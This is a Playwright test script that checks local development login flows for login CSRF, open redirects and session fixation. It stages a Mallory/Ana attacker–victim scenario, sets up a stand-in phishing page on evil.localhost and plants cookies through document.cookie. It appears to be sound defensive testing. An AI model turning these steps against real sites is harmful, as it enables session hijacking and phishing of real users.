// Tries three holes in a site's login, in Chromium, with an attacker (Mallory) and a victim (Ana), each in a browser of
// their own, both logging in on the provider's development page (any password):
//   csrf      Mallory starts a login on the site as herself and stops at the callback, keeping its address (her own,
//             unused code). Ana's browser opens that address (as a link or an image on Mallory's page would make it):
//             what does the site then say to Ana?
//   redirect  Ana follows a link to the site's /login?next=http://evil.localhost:7777/ and logs in: where does she end up?
//   fixation  Mallory opens the site's /login, which gives her browser a session cookie, and plants that cookie in
//             Ana's browser (here with document.cookie, as a script on a neighbouring site could). Ana logs in. Then
//             Mallory, with the same cookie, opens the site: whose page does she see?
// With --shots <dir>: <name>_csrf.png (Ana, on opening the address), <name>_redirect.png (Ana), <name>_fixation.png
// (Mallory).
// Each site is name=address, and after commas its login and callback paths when they aren't /login and /callback:
//   node holes.mjs go=http://trail.localhost:8092 quillo=http://trail.localhost:8080 [--shots <dir>]
import { chromium } from 'playwright';
import http from 'node:http';
// evil.localhost:7777 is a stand-in, served here, for "a site that isn't the club's".
const EVIL = 'http://evil.localhost:7777/';
const evil = http.createServer((req, res) => res.writeHead(200, { 'content-type': 'text/html' }).end(
  '<title>Evil Example</title><body style="font:20px system-ui;background:#2b1111;color:#fff;padding:30px">' +
  '<h1>Evil Example</h1><p>Your session ended. Please enter your password again.</p>')).listen(7777);
const args = process.argv.slice(2), si = args.indexOf('--shots'), shots = si >= 0 ? args.splice(si, 2)[1] : null;
const browser = await chromium.launch();
const results = {};
const fresh = async () => {
  const ctx = await browser.newContext({ viewport: { width: 640, height: 440 }, deviceScaleFactor: shots ? 3 : 1 });
  return { ctx, page: await ctx.newPage() };
};
const provider = async (page, who) => {     // the provider's login page, if it asks
  await page.waitForLoadState('networkidle');
  if (await page.locator('input[name=login]').count()) {
    await page.fill('input[name=login]', who); await page.fill('input[name=password]', 'any password');
    await page.click('button[type=submit]');
  }
};
const look = async (page) => ({ url: page.url().replace(/^https?:\/\//, '').replace(/\?.*/, ''), title: await page.title(),
  h1: (await page.locator('h1').count()) ? (await page.locator('h1').first().innerText()).trim() : null });
for (const [name, site] of args.map((a) => a.split('='))) {
  const [base, login = '/login', callbackPath = '/callback'] = site.split(',');
  const r = {};
  // 1. Login CSRF.
  {
    const m = await fresh(), a = await fresh();
    // Mallory's login, by her browser's own HTTP client (its cookies), each redirect followed by hand, up to the
    // site's callback, which she keeps instead of opening.
    let url = base + login, callback = null;
    for (let hop = 0; hop < 12 && !callback; hop++) {
      let res = await m.ctx.request.get(url, { maxRedirects: 0 });
      if (res.status() === 200 && (await res.text()).includes('name="login"')) {
        const action = /action="([^"]+)"/.exec(await res.text())[1];
        res = await m.ctx.request.post(new URL(action, url).href, { form: { prompt: 'login', login: 'mallory', password: 'any password' }, maxRedirects: 0 });
      }
      const next = new URL(res.headers()['location'], url).href;
      if (next.startsWith(`${base}${callbackPath}`)) callback = next; else url = next;
    }
    await a.page.goto(callback); await a.page.waitForLoadState('networkidle');
    const after = await look(a.page);
    if (shots) await a.page.screenshot({ path: `${shots}/${name}_csrf.png` });   // what opening the address showed Ana
    await a.page.goto(base + '/'); r.csrf = { callback_params: [...new URL(callback).searchParams.keys()], after, home: await look(a.page) };
    await m.ctx.close(); await a.ctx.close();
  }
  // 2. Open redirect.
  {
    const a = await fresh();
    await a.page.goto(base + login + '?next=' + encodeURIComponent(EVIL));
    await provider(a.page, 'ana');
    await a.page.waitForLoadState('networkidle'); await a.page.waitForTimeout(300);
    r.redirect = await look(a.page);
    if (shots) await a.page.screenshot({ path: `${shots}/${name}_redirect.png` });
    await a.ctx.close();
  }
  // 3. Session fixation.
  {
    const m = await fresh(), a = await fresh();
    await m.ctx.route('http://localhost:4000/**', (route) => route.abort());       // Mallory only wants the cookie
    await m.page.goto(base + login).catch(() => {});
    const planted = (await m.ctx.cookies(base)).find((c) => /connect\.sid|quillo_session|JSESSIONID|^club$/.test(c.name));
    await a.page.goto(base + '/');
    // A site that gives no session cookie before a login has none to plant.
    if (planted) await a.page.evaluate(({ name, value }) => { document.cookie = `${name}=${value}; path=/${name.startsWith('__Host-') ? '; secure' : ''}`; }, planted);
    const took = !!planted && (await a.ctx.cookies(base)).some((c) => c.name === planted.name && c.value === planted.value);
    await a.page.click('text=Log in'); await provider(a.page, 'ana');
    await a.page.waitForURL((u) => u.href.startsWith(base + '/') && !u.pathname.startsWith('/login') && !u.pathname.startsWith(callbackPath));
    const ana = await look(a.page);
    await m.ctx.unroute('http://localhost:4000/**');
    await m.page.goto(base + '/');
    r.fixation = { cookie: planted?.name ?? null, planted: took, ana, mallory: await look(m.page) };
    if (shots) await m.page.screenshot({ path: `${shots}/${name}_fixation.png` });
    await m.ctx.close(); await a.ctx.close();
  }
  r.login = login;
  results[name] = r;
}
await browser.close();
evil.close();
console.log(JSON.stringify(results, null, 1));
// Each site's results, one line a hole, on stderr, for people: what Ana's browser shows after opening Mallory's callback
// (its heading, or its title when it has none), where Ana ends up after ?next=, and what Mallory sees with her cookie.
const said = (p) => p.h1 ?? p.title;
for (const [name, r] of Object.entries(results)) {
  console.error(`${name}:`);
  console.error(`  login CSRF      Ana opens Mallory's callback: "${said(r.csrf.after)}"; Ana's home page: "${said(r.csrf.home)}"`);
  console.error(`  open redirect   ${r.login}?next=evil.localhost:7777 ends on ${r.redirect.url}`);
  console.error(r.fixation.cookie
    ? `  planted cookie  Mallory's ${r.fixation.cookie}, after Ana logs in, shows Mallory: "${said(r.fixation.mallory)}"`
    : `  planted cookie  no session cookie before a login, none to plant; Mallory sees: "${said(r.fixation.mallory)}"`);
}
